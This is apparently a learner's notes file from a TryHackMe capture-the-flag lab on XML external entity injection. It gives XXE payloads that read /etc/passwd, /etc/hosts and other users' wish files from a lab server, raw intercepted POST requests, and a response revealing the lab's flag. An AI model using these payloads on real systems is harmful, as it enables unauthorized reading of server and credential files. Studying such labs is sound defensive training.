@@ -1,0 +1,167 @@
+Extentsible Markup Language (XML)
+==================================
+<people>
+   <name>Glitch</name>
+   <address>Wareville</address>
+   <email>glitch@wareville.com</email>
+   <phone>111000</phone>
+</people>
+
+
+DTD
+=====
+<!DOCTYPE people [
+   <!ELEMENT people(name, address, email, phone)>
+   <!ELEMENT name (#PCDATA)>
+   <!ELEMENT address (#PCDATA)>
+   <!ELEMENT email (#PCDATA)>
+   <!ELEMENT phone (#PCDATA)>
+]>
+
+Note: In the above DTD, <!ELEMENT>  defines the elements (tags) that are allowed, like name, address, email, and phone, whereas #PCDATA stands for parsed people data, meaning it will consist of just plain text.
+
+Entities
+=========
+<!DOCTYPE people [
+   <!ENTITY ext SYSTEM "http://tryhackme.com/robots.txt">
+]>
+<people>
+   <name>Glitch</name>
+   <address>&ext;</address>
+   <email>glitch@wareville.com</email>
+   <phone>111000</phone>
+</people>
+
+
+>> Vulnerability testing
+========================
+<!DOCTYPE people[
+   <!ENTITY thmFile SYSTEM "file:///etc/passwd">
+]>
+<people>
+   <name>Glitch</name>
+   <address>&thmFile;</address>
+   <email>glitch@wareville.com</email>
+   <phone>111000</phone>
+</people>
+
+
+
+
+
+http://10.49.170.227/
+http://10.49.170.227/product.php?id=1
+
+
+
+POST /wishlist.php HTTP/1.1
+Host: 10.49.170.227
+Content-Length: 215
+Accept-Language: en-US,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Content-Type: application/xml
+Accept: */*
+Origin: http://10.49.170.227
+Referer: http://10.49.170.227/product.php
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+POST /wishlist.php HTTP/1.1
+Host: 10.49.170.227
+Content-Length: 313
+Accept-Language: en-US,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Content-Type: application/xml
+Accept: */*
+Origin: http://10.49.170.227
+Referer: http://10.49.170.227/product.php?id=1
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=33ppc14o94p314nbnn49nl0b6k
+Connection: keep-alive
+
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]>
+                <wishlist>
+                    <user_id>1</user_id>
+                    <item>
+                        <product_id>&payload;</product_id>
+                    </item>
+                </wishlist>
+
+
+
+
+
+
+
+
+
+Inruder
+=========================
+POST /wishlist.php HTTP/1.1
+Host: 10.49.170.227
+Content-Length: 335
+Accept-Language: en-US,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Content-Type: application/xml
+Accept: */*
+Origin: http://10.49.170.227
+Referer: http://10.49.170.227/product.php?id=1
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=33ppc14o94p314nbnn49nl0b6k
+Connection: keep-alive
+
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_1.txt"> ]>
+                <wishlist>
+                    <user_id>1</user_id>
+                    <item>
+                        <product_id>&payload;</product_id>
+                    </item>
+                </wishlist>
+            
+
+
+
+
+
+POST /wishlist.php HTTP/1.1
+Host: 10.49.170.227
+Content-Length: 335
+Accept-Language: en-US,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Content-Type: application/xml
+Accept: */*
+Origin: http://10.49.170.227
+Referer: http://10.49.170.227/product.php?id=1
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=33ppc14o94p314nbnn49nl0b6k
+Connection: keep-alive
+
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_15.txt"> ]>
+                <wishlist>
+                    <user_id>1</user_id>
+                    <item>
+                        <product_id>&payload;</product_id>
+                    </item>
+                </wishlist>
+            
+HTTP/1.1 200 OK
+Date: Thu, 15 Jan 2026 17:50:50 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 224
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+The product ID: Wish #15
+Name: Mayor Malware
+Address: Test
+---------------------------------------
+Product: Waredy Cane
+Quantity: 1
+---------------------------------------
+PS: The flag is THM{Brut3f0rc1n6_mY_w4y}
+is invalid.
